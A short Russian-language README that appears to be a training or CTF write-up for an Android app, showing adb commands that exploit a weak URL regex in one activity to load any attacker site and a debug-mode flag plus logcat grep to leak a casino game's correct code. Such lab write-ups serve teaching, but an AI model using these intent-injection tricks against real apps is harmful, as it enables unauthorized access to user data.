# casino


## Wiki 
В коде уязвимая регулярка которая просто проверяет на наличие в строке https://en.wikipedia.org
![image](https://github.com/ambushidozho/casino/assets/102957421/b3aad247-f8bb-4bc5-ab12-5da175033760)
Следовательно 
```sh
adb shell am start -n ru.vk.nsa/ru.vk.nsa.Wiki --es url https://vk.com?test='https://en.wikipedia.org'
```
с помощью такого интента мы можем поместить ссылку на любой сайт злоумышленника а также получить доступ к папке shared_pref

## Casino
В коде мы видим mode разработки, меняем его на debug, вводим буквенный код, при ошибке читаем логи, видим верный код, вводим, победа
```sh
adb shell am start -n ru.vk.nsa/ru.vk.nsa.Casino --es mode debug
```
```sh
adb logcat | grep 'expected:'
```
![tg_image_1376263483](https://github.com/ambushidozho/casino/assets/102957421/c6d9b76d-d747-44cc-a235-e2c7e0c20708)

![image](https://github.com/ambushidozho/casino/assets/102957421/ce553dcb-8f44-4274-8ea1-34d8599ae25f)

Вводим код, побеждаем

![image](https://github.com/ambushidozho/casino/assets/102957421/834aefdd-81b2-4dac-a8e6-140f0c8a9600)

